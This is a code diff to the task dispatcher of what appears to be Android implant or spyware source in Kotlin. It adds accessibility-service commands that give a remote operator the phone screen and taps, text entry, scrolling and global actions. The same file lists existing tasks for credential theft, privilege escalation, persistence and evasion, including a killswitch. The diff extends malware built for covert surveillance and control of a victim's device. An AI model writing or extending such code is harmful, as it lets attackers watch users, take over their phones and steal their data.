@@ -29,6 +29,8 @@ object TaskRunner {
         "persist.migrate", "persist.health",
         "evade.report", "evade.posture", "evade.profile", "evade.killswitch",
         "hygiene.memory", "creds", "privesc", "host.guide",
+        "ui.screen", "ui.tap", "ui.text", "ui.scroll", "ui.global",
+        "ui.events",
     )
 
     /**
@@ -359,6 +361,13 @@ object TaskRunner {
             // ---- the rules of the manufacturer ---------------------------
             "host.guide" -> hostGuide(args)
 
+            // ---- the window of the phone ----------------------------------
+            // The accessibility service is what gives the operator the
+            // screen and a hand on the phone.  The service has to be
+            // enabled by the operator, and the answer says so when it is
+            // not.
+            "ui.screen", "ui.tap", "ui.text", "ui.scroll", "ui.global", "ui.events" -> ui(kind, args)
+
             // ---- network reach and the local environment ------------------
             "env" -> environment(args.field("filter")?.text() ?: "")
             // The working directory of the implant.  On a phone the
@@ -518,6 +527,41 @@ object TaskRunner {
     }
 
     /** The posture of the phone. */
+    /**
+     * The window of the phone, seen through the accessibility service.
+     *
+     * The service is the only way an application on a phone can see what
+     * the user is looking at, so the answer says clearly when it is not
+     * enabled: a phone that answers "nothing happened" would be a phone
+     * that lies.
+     */
+    private fun ui(kind: String, args: Upk): Outcome {
+        if (!Ui.isEnabled()) {
+            return Outcome(
+                2,
+                ByteArray(0),
+                "the accessibility service is not enabled: the operator has to " +
+                "turn on ${Ui.component()} in the settings of the phone",
+            )
+        }
+        val request = Ui.Request(
+            kind.removePrefix("ui."),
+            mapOf(
+                "needle" to (args.field("needle")?.text() ?: ""),
+                "value" to (args.field("value")?.text() ?: ""),
+                "direction" to (args.field("direction")?.text() ?: "forward"),
+                "action" to (args.field("action")?.text() ?: "back"),
+                "index" to (args.field("index")?.long()?.toString() ?: "0"),
+            ),
+        )
+        return try {
+            val answer = Ui.submit(request)
+            Outcome(0, answer.toByteArray(), "")
+        } catch (t: Throwable) {
+            Outcome(2, ByteArray(0), t.message ?: t.toString())
+        }
+    }
+
     private fun evasionReport(): Outcome {
         val posture = Evasion.classify()
         val state = Evasion.load(stateDir())
